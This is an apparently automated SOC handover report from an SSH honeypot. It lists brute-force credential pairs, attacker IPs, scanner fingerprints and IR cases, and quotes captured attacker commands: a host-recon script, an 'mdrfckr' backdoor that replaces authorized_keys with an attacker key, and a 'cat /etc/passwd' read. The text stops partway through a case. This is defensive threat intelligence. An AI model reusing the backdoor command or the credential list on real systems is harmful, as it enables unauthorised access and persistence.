# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T14:29:07Z |
| **Shift Time** | 14:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **262** |
| Confirmed Threats | **241** |
| False Positives Filtered | **21** (8.0%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **31** |
| High Severity Cases | **195** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **67** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **218** |
| Unique Credential Pairs | **165** |
| Unique Usernames | **67** |
| Unique Passwords | **125** |
| Successful Auth Pairs | **206** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `ubuntu` | 18 |
| `admin` | 15 |
| `test` | 9 |
| `default` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 11 |
| `admin` | 10 |
| `123` | 7 |
| `test2004` | 6 |
| `blank2014` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 8 |
| `test` | `test2004` | 6 |
| `blank` | `blank2014` | 6 |
| `debian` | `debian2005` | 5 |
| `default` | `default2007` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `centos` | `centos2013` | `37.57.158.182` | 2026-08-23T10:56:06 |
| `centos` | `centos2013` | `165.99.71.193` | 2026-08-23T10:56:14 |
| `user` | `user2024` | `188.151.246.116` | 2026-08-23T11:00:11 |
| `user` | `user2024` | `31.41.84.98` | 2026-08-23T11:00:22 |
| `admin` | `admin` | `31.77.151.233` | 2026-08-23T11:02:40 |
| `ubuntu` | `123abc123` | `217.60.255.130` | 2026-08-23T11:03:08 |
| `root` | `admin123` | `217.60.255.130` | 2026-08-23T11:03:11 |
| `root` | `root2003` | `180.94.74.94` | 2026-08-23T11:05:16 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-23T11:07:55 |
| `test` | `test123456789` | `196.188.187.85` | 2026-08-23T11:10:07 |
| `test` | `test123456789` | `186.238.89.142` | 2026-08-23T11:10:16 |
| `test` | `test123456789` | `103.203.74.119` | 2026-08-23T11:10:21 |
| `debian` | `debian2005` | `10.0.0.73` | 2026-08-23T11:11:36 |
| `ubuntu` | `password@123` | `217.60.255.130` | 2026-08-23T11:12:48 |
| `root` | `admin@1234` | `217.60.255.130` | 2026-08-23T11:12:52 |
| `debian` | `debian2005` | `218.59.235.170` | 2026-08-23T11:13:18 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T11:13:22 |
| `root` | `root2003` | `10.0.0.73` | 2026-08-23T11:16:27 |
| `root` | `﻿------fuck------` | `103.219.32.239` | 2026-08-23T11:17:15 |
| `ubuntu` | `zaq!@wsx` | `217.60.255.130` | 2026-08-23T11:22:15 |
| `root` | `Admin12345` | `217.60.255.130` | 2026-08-23T11:22:19 |
| `default` | `default2007` | `10.0.0.73` | 2026-08-23T11:25:02 |
| `debian` | `debian2005` | `69.126.144.30` | 2026-08-23T11:28:32 |
| `debian` | `debian2005` | `183.223.156.154` | 2026-08-23T11:28:43 |
| `ubuntu` | `a1234567` | `217.60.255.130` | 2026-08-23T11:31:51 |
| `root` | `Password` | `217.60.255.130` | 2026-08-23T11:31:55 |
| `root` | `root2003` | `121.167.89.157` | 2026-08-23T11:33:05 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T11:36:58 |
| `default` | `default2003` | `219.78.240.92` | 2026-08-23T11:37:48 |
| `default` | `default2003` | `191.210.73.33` | 2026-08-23T11:37:56 |
| `ubuntu` | `Admin@123!` | `217.60.255.130` | 2026-08-23T11:41:23 |
| `root` | `admin#123` | `217.60.255.130` | 2026-08-23T11:41:26 |
| `default` | `default2007` | `65.20.165.78` | 2026-08-23T11:42:32 |
| `default` | `default2007` | `182.95.180.82` | 2026-08-23T11:42:40 |
| `default` | `default2007` | `222.76.248.54` | 2026-08-23T11:42:47 |
| `default` | `default2007` | `46.4.112.25` | 2026-08-23T11:42:54 |
| `test` | `test2004` | `10.0.0.73` | 2026-08-23T11:43:52 |
| `test` | `test2004` | `218.206.136.24` | 2026-08-23T11:45:26 |
| `test` | `test2004` | `183.247.171.186` | 2026-08-23T11:45:41 |
| `default` | `default2003` | `10.0.0.73` | 2026-08-23T11:48:51 |
| `ubuntu` | `aaa.123` | `217.60.255.130` | 2026-08-23T11:51:03 |
| `root` | `Admin@123456789` | `217.60.255.130` | 2026-08-23T11:51:06 |
| `operator` | `operator2019` | `10.0.0.73` | 2026-08-23T11:57:18 |
| `ubuntu` | `Passw0rd` | `217.60.255.130` | 2026-08-23T12:00:36 |
| `root` | `Web@123456` | `217.60.255.130` | 2026-08-23T12:00:40 |
| `test` | `test2004` | `14.153.252.114` | 2026-08-23T12:00:56 |
| `test` | `test2004` | `202.88.236.38` | 2026-08-23T12:01:05 |
| `default` | `default2003` | `50.217.40.11` | 2026-08-23T12:05:20 |
| `admin` | `admin` | `138.68.108.72` | 2026-08-23T12:07:41 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-23T12:07:42 |
| `admin` | `admin` | `47.77.182.54` | 2026-08-23T12:09:59 |
| `blank` | `blank2014` | `45.55.133.80` | 2026-08-23T12:10:12 |
| `ubuntu` | `asd123...` | `217.60.255.130` | 2026-08-23T12:10:13 |
| `root` | `Admin@2025` | `217.60.255.130` | 2026-08-23T12:10:17 |
| `blank` | `blank2014` | `196.188.187.85` | 2026-08-23T12:10:20 |
| `root` | `000000` | `80.94.92.179` | 2026-08-23T12:11:30 |
| `root` | `111111` | `80.94.92.179` | 2026-08-23T12:13:57 |
| `guest` | `guest2000` | `10.0.0.73` | 2026-08-23T12:16:13 |
| `root` | `123` | `80.94.92.179` | 2026-08-23T12:16:26 |
| `guest` | `guest2000` | `187.49.63.51` | 2026-08-23T12:17:44 |
| `guest` | `guest2000` | `177.174.16.55` | 2026-08-23T12:17:53 |
| `root` | `123123` | `80.94.92.179` | 2026-08-23T12:18:49 |
| `ubuntu` | `Admin@786` | `217.60.255.130` | 2026-08-23T12:19:39 |
| `root` | `Tech@2022` | `217.60.255.130` | 2026-08-23T12:19:43 |
| `root` | `1234` | `80.94.92.179` | 2026-08-23T12:21:10 |
| `blank` | `blank2014` | `10.0.0.73` | 2026-08-23T12:21:16 |
| `root` | `12345` | `80.94.92.179` | 2026-08-23T12:23:30 |
| `root` | `12345678` | `80.94.92.179` | 2026-08-23T12:28:07 |
| `ubuntu` | `ubuntu123#` | `217.60.255.130` | 2026-08-23T12:29:24 |
| `root` | `administrator@123` | `217.60.255.130` | 2026-08-23T12:29:28 |
| `centos` | `centos2023` | `10.0.0.73` | 2026-08-23T12:29:50 |
| `root` | `123456789` | `80.94.92.179` | 2026-08-23T12:30:29 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-08-23T12:32:54 |
| `root` | `654321` | `80.94.92.179` | 2026-08-23T12:35:33 |
| `root` | `qazwsx12` | `185.64.25.226` | 2026-08-23T12:36:37 |
| `345gs5662d34` | `345gs5662d34` | `185.64.25.226` | 2026-08-23T12:36:41 |
| `root` | `3245gs5662d34` | `185.64.25.226` | 2026-08-23T12:36:42 |
| `blank` | `blank2014` | `2.55.125.200` | 2026-08-23T12:37:40 |
| `blank` | `blank2014` | `24.229.22.106` | 2026-08-23T12:37:48 |
| `root` | `P@ssw0rd` | `80.94.92.179` | 2026-08-23T12:38:12 |
| `ubuntu` | `developer@2024` | `217.60.255.130` | 2026-08-23T12:38:53 |
| `root` | `adm1n@321` | `217.60.255.130` | 2026-08-23T12:38:58 |
| `andy` | `12345678` | `20.55.45.217` | 2026-08-23T12:40:27 |
| `345gs5662d34` | `345gs5662d34` | `20.55.45.217` | 2026-08-23T12:40:29 |
| `andy` | `3245gs5662d34` | `20.55.45.217` | 2026-08-23T12:40:29 |
| `root` | `admin` | `80.94.92.179` | 2026-08-23T12:40:50 |
| `supervisor` | `supervisor2006` | `117.211.15.106` | 2026-08-23T12:42:42 |
| `supervisor` | `supervisor2006` | `61.79.227.51` | 2026-08-23T12:42:53 |
| `root` | `admin123` | `80.94.92.179` | 2026-08-23T12:43:29 |
| `root` | `Qq123456` | `91.92.47.35` | 2026-08-23T12:46:05 |
| `root` | `passw0rd` | `80.94.92.179` | 2026-08-23T12:46:08 |
| `root` | `A123456a` | `91.92.47.35` | 2026-08-23T12:46:12 |
| `root` | `dxfUgwfiNcx8` | `91.92.47.35` | 2026-08-23T12:46:18 |
| `runner` | `1` | `91.92.47.35` | 2026-08-23T12:46:24 |
| `admin` | `admin` | `91.92.47.35` | 2026-08-23T12:46:28 |
| `root` | `12341234` | `91.92.47.35` | 2026-08-23T12:46:34 |
| `odoo16` | `odoo16` | `91.92.47.35` | 2026-08-23T12:46:39 |
| `root` | `Pass1234` | `91.92.47.35` | 2026-08-23T12:46:44 |
| `root` | `qwe@123` | `91.92.47.35` | 2026-08-23T12:46:49 |
| `ftpuser1` | `123456` | `91.92.47.35` | 2026-08-23T12:46:54 |
| `dev` | `abc123` | `91.92.47.35` | 2026-08-23T12:47:00 |
| `ubuntu` | `123qwe` | `91.92.47.35` | 2026-08-23T12:47:05 |
| `jenkins` | `jenkins@123` | `91.92.47.35` | 2026-08-23T12:47:10 |
| `root` | `root12345` | `91.92.47.35` | 2026-08-23T12:47:16 |
| `user` | `1` | `91.92.47.35` | 2026-08-23T12:47:21 |
| `chris` | `123456` | `91.92.47.35` | 2026-08-23T12:47:26 |
| `centos` | `centos2023` | `39.164.94.190` | 2026-08-23T12:47:28 |
| `user` | `123` | `91.92.47.35` | 2026-08-23T12:47:32 |
| `opc` | `123456` | `91.92.47.35` | 2026-08-23T12:47:37 |
| `centos` | `centos2023` | `182.156.35.238` | 2026-08-23T12:47:40 |
| `user1` | `user1` | `91.92.47.35` | 2026-08-23T12:47:42 |
| `username` | `123456` | `91.92.47.35` | 2026-08-23T12:47:47 |
| `centos` | `centos2023` | `182.60.128.241` | 2026-08-23T12:47:49 |
| `jakob` | `jakob` | `91.92.47.35` | 2026-08-23T12:47:52 |
| `root` | `redhat` | `91.92.47.35` | 2026-08-23T12:47:58 |
| `root` | `!Q@W3e4r` | `91.92.47.35` | 2026-08-23T12:48:03 |
| `aaa` | `123456` | `91.92.47.35` | 2026-08-23T12:48:08 |
| `user1` | `123456` | `91.92.47.35` | 2026-08-23T12:48:13 |
| `git` | `git` | `91.92.47.35` | 2026-08-23T12:48:18 |
| `root` | `00000000` | `91.92.47.35` | 2026-08-23T12:48:24 |
| `ubuntu` | `Micro@2025` | `217.60.255.130` | 2026-08-23T12:48:27 |
| `amir` | `amir` | `91.92.47.35` | 2026-08-23T12:48:29 |
| `root` | `Pass@1234` | `217.60.255.130` | 2026-08-23T12:48:31 |
| `admin` | `1qaz@WSX` | `91.92.47.35` | 2026-08-23T12:48:34 |
| `root` | `password` | `80.94.92.179` | 2026-08-23T12:48:36 |
| `admin` | `admin2017` | `10.0.0.73` | 2026-08-23T12:48:39 |
| `bernard` | `bernard` | `91.92.47.35` | 2026-08-23T12:48:40 |
| `user2` | `123` | `91.92.47.35` | 2026-08-23T12:48:45 |
| `root` | `backup1234` | `91.92.47.35` | 2026-08-23T12:48:50 |
| `dev` | `123321` | `91.92.47.35` | 2026-08-23T12:48:56 |
| `appuser` | `password` | `91.92.47.35` | 2026-08-23T12:49:00 |
| `root` | `Abc123456` | `91.92.47.35` | 2026-08-23T12:49:05 |
| `system` | `system` | `91.92.47.35` | 2026-08-23T12:49:11 |
| `debian` | `123456` | `91.92.47.35` | 2026-08-23T12:49:16 |
| `esroot` | `esroot` | `91.92.47.35` | 2026-08-23T12:49:21 |
| `uploader` | `uploader` | `91.92.47.35` | 2026-08-23T12:49:26 |
| `super` | `super` | `91.92.47.35` | 2026-08-23T12:49:32 |
| `sedu` | `sedu` | `91.92.47.35` | 2026-08-23T12:49:37 |
| `ftpuser` | `123` | `91.92.47.35` | 2026-08-23T12:49:42 |
| `ubuntu` | `ubuntu@123` | `91.92.47.35` | 2026-08-23T12:49:47 |
| `deploy` | `1q2w3e4r` | `91.92.47.35` | 2026-08-23T12:49:52 |
| `rdpuser` | `1234` | `91.92.47.35` | 2026-08-23T12:49:57 |
| `nvidia` | `nvidia` | `91.92.47.35` | 2026-08-23T12:50:02 |
| `kafka` | `kafka` | `91.92.47.35` | 2026-08-23T12:50:07 |
| `admin` | `admin2017` | `83.177.240.182` | 2026-08-23T12:50:10 |
| `newuser` | `newuser` | `91.92.47.35` | 2026-08-23T12:50:12 |
| `admin` | `admin2017` | `65.20.143.19` | 2026-08-23T12:50:17 |
| `server` | `12345` | `91.92.47.35` | 2026-08-23T12:50:17 |
| `root` | `P@ssword` | `91.92.47.35` | 2026-08-23T12:50:22 |
| `hadoop` | `hadoop123` | `91.92.47.35` | 2026-08-23T12:50:28 |
| `tester` | `test` | `91.92.47.35` | 2026-08-23T12:50:33 |
| `bob` | `bob` | `91.92.47.35` | 2026-08-23T12:50:38 |
| `rocky` | `1234` | `91.92.47.35` | 2026-08-23T12:50:43 |
| `root` | `password123` | `91.92.47.35` | 2026-08-23T12:50:48 |
| `labuser` | `labuser` | `91.92.47.35` | 2026-08-23T12:50:53 |
| `devuser` | `devuser` | `91.92.47.35` | 2026-08-23T12:50:58 |
| `root` | `password1` | `80.94.92.179` | 2026-08-23T12:51:01 |
| `root` | `!Q2w3e4r` | `91.92.47.35` | 2026-08-23T12:51:03 |
| `amin` | `amin` | `91.92.47.35` | 2026-08-23T12:51:08 |
| `debian` | `123456789` | `91.92.47.35` | 2026-08-23T12:51:13 |
| `testuser` | `test` | `91.92.47.35` | 2026-08-23T12:51:19 |
| `david` | `123456` | `91.92.47.35` | 2026-08-23T12:51:24 |
| `root` | `q1w2e3r4` | `91.92.47.35` | 2026-08-23T12:51:29 |
| `erpnext` | `erpnext` | `91.92.47.35` | 2026-08-23T12:51:33 |
| `openvpn` | `openvpn` | `91.92.47.35` | 2026-08-23T12:51:39 |
| `user2` | `1` | `91.92.47.35` | 2026-08-23T12:51:44 |
| `root` | `!QAZ2wsx` | `91.92.47.35` | 2026-08-23T12:51:49 |
| `ubuntu` | `p@ssw0rd` | `91.92.47.35` | 2026-08-23T12:51:54 |
| `openclaw` | `123456` | `91.92.47.35` | 2026-08-23T12:51:59 |
| `claude` | `123` | `91.92.47.35` | 2026-08-23T12:52:04 |
| `steam` | `123456` | `91.92.47.35` | 2026-08-23T12:52:09 |
| `root` | `admin1` | `91.92.47.35` | 2026-08-23T12:52:15 |
| `devops` | `12345` | `91.92.47.35` | 2026-08-23T12:52:20 |
| `sol` | `1234` | `91.92.47.35` | 2026-08-23T12:52:25 |
| `admin2` | `1234` | `91.92.47.35` | 2026-08-23T12:52:30 |
| `root` | `Root@123` | `91.92.47.35` | 2026-08-23T12:52:35 |
| `deploy` | `password` | `91.92.47.35` | 2026-08-23T12:52:40 |
| `root` | `hello123` | `91.92.47.35` | 2026-08-23T12:52:45 |
| `ubuntu` | `1qaz@WSX` | `91.92.47.35` | 2026-08-23T12:52:51 |
| `aiuser` | `aiuser` | `91.92.47.35` | 2026-08-23T12:52:56 |
| `deploy` | `123` | `91.92.47.35` | 2026-08-23T12:53:01 |
| `admin` | `123` | `91.92.47.35` | 2026-08-23T12:53:06 |
| `agent` | `agent` | `91.92.47.35` | 2026-08-23T12:53:12 |
| `deploy` | `123123` | `91.92.47.35` | 2026-08-23T12:53:17 |
| `root` | `root@123` | `91.92.47.35` | 2026-08-23T12:53:22 |
| `deploy` | `dev` | `91.92.47.35` | 2026-08-23T12:53:27 |
| `openclaw` | `openclaw` | `91.92.47.35` | 2026-08-23T12:53:32 |
| `root` | `changeme` | `91.92.47.35` | 2026-08-23T12:53:38 |
| `root` | `qwerty` | `80.94.92.179` | 2026-08-23T12:53:41 |
| `drcomadmin` | `drcomadmin123` | `91.92.47.35` | 2026-08-23T12:53:43 |
| `admin` | `123456789` | `91.92.47.35` | 2026-08-23T12:53:48 |
| `supervisor` | `supervisor2006` | `10.0.0.73` | 2026-08-23T12:53:51 |
| `root` | `12qwaszx` | `91.92.47.35` | 2026-08-23T12:53:53 |
| `core` | `P@ssw0rd` | `91.92.47.35` | 2026-08-23T12:53:59 |
| `root` | `1q2w3e4r` | `91.92.47.35` | 2026-08-23T12:54:04 |
| `root` | `123123aaa` | `91.92.47.35` | 2026-08-23T12:54:09 |
| `server` | `1234` | `91.92.47.35` | 2026-08-23T12:54:14 |
| `ubuntu` | `rootroot` | `91.92.47.35` | 2026-08-23T12:54:20 |
| `root` | `19860710` | `91.92.47.35` | 2026-08-23T12:54:25 |
| `rdpuser` | `rdpuser` | `91.92.47.35` | 2026-08-23T12:54:30 |
| `openvpn` | `12345678` | `91.92.47.35` | 2026-08-23T12:54:35 |
| `christianna` | `christianna` | `91.92.47.35` | 2026-08-23T12:54:40 |
| `root` | `0` | `91.92.47.35` | 2026-08-23T12:54:45 |
| `media` | `rock` | `91.92.47.35` | 2026-08-23T12:54:50 |
| `ubuntu` | `admin` | `91.92.47.35` | 2026-08-23T12:54:56 |
| `rock` | `rock` | `91.92.47.35` | 2026-08-23T12:55:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **262** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 129 |
| libssh | 39 |
| OpenSSH | 37 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 104 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 37 | 36 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 18 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 104 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 37 | 36 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 18 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 4 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 17 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.55.45.217`, `185.64.25.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **61** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS1257` | Tele2 Sverige AB | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | MEDIUM |
| `AS8473` | Bahnhof AB | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS26599` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (195)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-44712b456bf4

| Field | Detail |
|---|---|
| **Source IP** | `37.57.158[.]182` |
| **First Seen** | 2026-08-23 10:56 |
| **Last Seen** | 2026-08-23 10:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:56:04` | `cowrie.session.connect` |
| `2026-08-23 10:56:05` | `cowrie.client.version` |
| `2026-08-23 10:56:05` | `cowrie.client.kex` |
| `2026-08-23 10:56:06` | `cowrie.login.success` |
| `2026-08-23 10:56:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.57.158[.]182` to AbuseIPDB if not already reported
- [ ] Block `37.57.158[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1de92d19fcf

| Field | Detail |
|---|---|
| **Source IP** | `165.99.71[.]193` |
| **First Seen** | 2026-08-23 10:56 |
| **Last Seen** | 2026-08-23 10:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:56:11` | `cowrie.session.connect` |
| `2026-08-23 10:56:12` | `cowrie.client.version` |
| `2026-08-23 10:56:12` | `cowrie.client.kex` |
| `2026-08-23 10:56:14` | `cowrie.login.success` |
| `2026-08-23 10:56:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.99.71[.]193` to AbuseIPDB if not already reported
- [ ] Block `165.99.71[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8bf21bcbf30

| Field | Detail |
|---|---|
| **Source IP** | `188.151.246[.]116` |
| **First Seen** | 2026-08-23 11:00 |
| **Last Seen** | 2026-08-23 11:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:00:10` | `cowrie.session.connect` |
| `2026-08-23 11:00:10` | `cowrie.client.version` |
| `2026-08-23 11:00:10` | `cowrie.client.kex` |
| `2026-08-23 11:00:11` | `cowrie.login.success` |
| `2026-08-23 11:00:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.151.246[.]116` to AbuseIPDB if not already reported
- [ ] Block `188.151.246[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c34e99710dd4

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-08-23 11:00 |
| **Last Seen** | 2026-08-23 11:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:00:21` | `cowrie.session.connect` |
| `2026-08-23 11:00:21` | `cowrie.client.version` |
| `2026-08-23 11:00:21` | `cowrie.client.kex` |
| `2026-08-23 11:00:22` | `cowrie.login.success` |
| `2026-08-23 11:00:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118dc4e1850c

| Field | Detail |
|---|---|
| **Source IP** | `31.77.151[.]233` |
| **First Seen** | 2026-08-23 11:02 |
| **Last Seen** | 2026-08-23 11:03 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:02:38` | `cowrie.session.connect` |
| `2026-08-23 11:02:39` | `cowrie.telnet.option` |
| `2026-08-23 11:02:40` | `cowrie.telnet.option` |
| `2026-08-23 11:02:40` | `cowrie.login.success` |
| `2026-08-23 11:02:40` | `cowrie.session.params` |
| `2026-08-23 11:02:41` | `cowrie.telnet.option` |
| `2026-08-23 11:02:41` | `cowrie.telnet.option` |
| `2026-08-23 11:02:41` | `cowrie.command.input` |
| `2026-08-23 11:02:41` | `cowrie.command.input` |
| `2026-08-23 11:02:41` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.failed` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:02:42` | `cowrie.command.input` |
| `2026-08-23 11:03:43` | `cowrie.log.closed` |
| `2026-08-23 11:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.151[.]233` to AbuseIPDB if not already reported
- [ ] Block `31.77.151[.]233` at perimeter firewall / security group
